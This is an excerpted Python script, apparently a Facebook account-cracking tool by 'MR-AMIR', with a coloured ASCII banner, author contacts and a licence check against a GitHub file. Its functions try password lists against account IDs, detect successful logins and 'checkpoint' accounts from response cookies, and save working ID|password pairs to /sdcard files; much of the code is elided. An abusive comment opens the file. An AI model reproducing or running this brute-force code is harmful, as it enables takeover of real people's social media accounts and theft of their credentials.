#assalamowalikom OPEN source by boos (MR-AMIR)
#Fuck YATEEM kid MR-AMIR
...
\033[1;32m 
   ...
   //  __'  \  |: \.        | |.  |   //      /  
/   /  \\  \ |.  \    /:  | /\  |\ |:  __   \   
(___/    \___)|___|\__/|___|(__\_|_)|__|  \___)                                              #

\033[1;93m--------------------------------------------------
\033[1;37m[-] AUTHOR    :\033[1;32m MR-AMIR
...
def auto_file(cookies,access_token):
    ...
    print('\n \033[1;35m /sdcard/Bos.txt \033[0;97m\n')
...
def manual_file(cookies,access_token):
    ...
    try:
        ...
        limit = 1
    print('\n \033[1;32mExample: /sdcard/Bos.txt \033[0;97m\n')
...
def sids():
    ...
    print('\n\033[1;32m Example: /sdcard/Bos.txt\033[0;97m')
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\r\r\033[1;32m [Bos-OK] %s | %s'%(ids,pas))
				open('/sdcard/Bos-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m [Bos-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/Bos-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def rcrack1(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [Bos-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/Bos-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [Bos-TL] '+ids+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [Bos-OK] '+ids+' | '+pas)
...
def menu_apikey():
  ...
  id = "_".join(uuid)
  server = requests.get('https://github.com/Malikamir28/Jado/blob/main/Amir.txt').text
 ...
 \033[1;93m=================================================
\033[1;37m[-] AUTHOR    :\033[1;32m MR-AMIR
\033[1;37m[-] GITHUB    :\033[1;32m BOOOSBRAND
\033[1;37m[-] WhatsApp  :\033[1;32m +923110346691
...
==================================================   """)
  ...
  try:
    httpCaht = requests.get("https://github.com/Malikamir28/Jado/blob/main/Amir.txt").text
    if id in httpCaht:
